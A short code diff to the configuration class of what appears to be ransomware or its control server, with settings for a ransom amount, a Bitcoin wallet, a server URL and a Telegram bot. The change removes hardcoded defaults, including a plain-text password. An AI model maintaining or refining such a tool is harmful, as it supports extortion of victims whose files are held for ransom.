@@ -51,11 +51,11 @@ except ImportError:
 # ============================================================================
 
 class Config:
-    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD', '40671Mps19*')
-    ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL', 'admin@pussalator.local')
-    BTC_WALLET = os.environ.get('BTC_WALLET', '1PussWalletVMTest')
+    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
+    ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
+    BTC_WALLET = os.environ.get('BTC_WALLET')
     RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT', '0.5')
-    SERVER_URL = os.environ.get('SERVER_URL', 'http://localhost:8000')
+    SERVER_URL = os.environ.get('SERVER_URL')
     TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
     TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
     SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
